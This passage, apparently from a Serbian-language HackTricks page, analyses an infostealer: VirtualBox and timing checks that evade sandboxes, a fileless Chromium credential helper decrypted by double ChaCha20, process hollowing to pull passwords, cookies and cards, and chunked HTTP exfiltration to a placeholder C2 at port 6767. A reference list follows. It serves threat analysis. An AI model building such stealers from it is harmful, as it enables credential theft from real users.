- Variant B proverava sistemske osobine (process-count floor, recent uptime), poziva `OpenServiceA("VBoxGuest")` da detektuje VirtualBox dodatke, i izvodi timing provere oko sleep-ova da uoči single-stepping. Svako podudaranje prekida izvršenje pre launch-a modula.

### Fileless helper + double ChaCha20 reflective loading

- Primarni DLL/EXE ugrađuje Chromium credential helper koji se ili dropuje na disk ili mapira manuelno u memoriju; fileless mode rešava imports/relocations sam, tako da se ne zapisuju helper artefakti.
- Taj helper čuva second-stage DLL šifrovan dvaput ChaCha20 (dva 32-bajtna ključa + 12-bajtni nonces). Nakon oba prolaza, reflectively loads blob (bez `LoadLibrary`) i poziva exporte `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` izvedene iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- ChromElevator rutine koriste direct-syscall reflective process hollowing da injektuju u živ Chromium browser, naslede AppBound Encryption ključeve i dešifruju passwords/cookies/credit cards direktno iz SQLite baza uprkos ABE hardening-u.

### Modularno prikupljanje u memoriji i chunked HTTP exfil

- `create_memory_based_log` iterira kroz globalnu function-pointer tabelu `memory_generators` i pokreće po jedan thread za svaki omogućen modul (Telegram, Discord, Steam, screenshots, documents, browser extensions, itd.). Svaki thread zapisuje rezultate u deljene buffere i prijavljuje broj fajlova nakon ~45s join window-a.
- Kada se završi, sve se zipuje statički linkovanom `miniz` bibliotekom kao `%TEMP%\\Log.zip`. `ThreadPayload1` zatim sleep-uje 15s i strimuje arhivu u chunk-ovima od 10 MB putem HTTP POST-a na `http://<C2>:6767/upload`, spoof-ujući browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Svaki chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opciono `w: <campaign_tag>`, a poslednji chunk pridodaje `complete: true` da C2 zna da je reassembly završen.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

{{#include ../banners/hacktricks-training.md}}
